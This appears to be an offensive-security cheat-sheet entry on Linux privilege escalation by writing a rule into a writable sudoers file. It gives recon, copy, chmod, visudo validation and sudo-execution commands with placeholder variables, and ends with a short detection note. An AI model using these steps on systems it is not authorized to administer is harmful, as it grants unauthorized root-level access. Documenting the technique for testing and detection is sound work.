---
technique: Sudoers Write Abuse
category: privilege-escalation
targets: Linux sudoers
protocols: Local
remote_capable: false
tags: linux privilege-escalation sudo sudoers file-write
---

# Sudoers Write Abuse

Writable sudoers files let an operator add privileged command rules when syntax validation and file permissions are satisfied.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Write access | Required on `/etc/sudoers` or a file under `/etc/sudoers.d` |
| Valid rule | A malformed rule can break sudo policy parsing |
| Correct mode | Drop-in files usually require mode `0440` |

## Linux

### Check sudoers include directory

#sh #sudo #recon

List sudoers drop-in files and permissions.

```sh title:"List sudoers drop-ins"
ls -la /etc/sudoers.d
```
<!-- cheat -->

### Validate sudoers policy

#sh #sudo #recon

Validate the current sudoers policy.

```sh title:"Validate sudoers policy"
visudo -c
```
<!-- cheat -->

### Step 1: Copy sudoers drop-in

#sh #sudo #file-write

Copy a prepared sudoers rule into the include directory.

```sh title:"Copy sudoers drop-in"
cp "$sudoers_file" "/etc/sudoers.d/$rule_name"
```
<!-- cheat
var sudoers_file
var rule_name
-->

### Step 2: Set sudoers drop-in mode

#sh #sudo #file-write

Set the expected mode on the sudoers drop-in.

```sh title:"Set sudoers drop-in mode"
chmod 440 "/etc/sudoers.d/$rule_name"
```
<!-- cheat
var rule_name
-->

### Step 3: Validate sudoers drop-in

#sh #sudo #file-write

Validate the new sudoers drop-in before relying on it.

```sh title:"Validate sudoers drop-in"
visudo -cf "/etc/sudoers.d/$rule_name"
```
<!-- cheat
var rule_name
-->

### Step 4: Use sudoers rule

#sh #sudo

Run the command granted by the new sudoers rule.

```sh title:"Run command from sudoers rule"
sudo "$allowed_command"
```
<!-- cheat
var allowed_command
-->

## Detection

Monitor writes to `/etc/sudoers`, `/etc/sudoers.d`, sudoers validation failures, and new NOPASSWD rules.
